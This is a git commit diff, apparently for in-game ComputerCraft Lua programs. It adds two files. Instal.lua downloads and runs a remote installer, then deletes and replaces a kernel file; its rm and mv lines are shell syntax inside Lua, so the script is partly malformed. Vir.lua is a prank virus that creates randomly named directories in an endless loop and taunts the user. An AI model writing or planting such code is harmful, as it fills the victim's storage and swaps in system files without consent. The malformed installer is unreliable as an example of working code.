3c5fa105a5c063f7ace744441defa6cbeb91ded0
minecartchris <130516132+minecartchris@users.noreply.github.com>
2024-04-23 19:32:40 -0500

    added reqied files

---
+++ Instal.lua
@@ -0,0 +1,3 @@
+shell.run("wget run https://raw.githubusercontent.com/Ryans-MC-Computer-Mods-Projects/POS/main/Install.lua")
+rm RTKrnl.lua
+mv modKrn RTKrnl.lua
---
+++ Vir.lua
@@ -0,0 +1,5 @@
+while true do
+    fs.makeDir(tostring(math.random(0, 1000)))
+    print("Hah nerd")
+    sleep(0)
+end
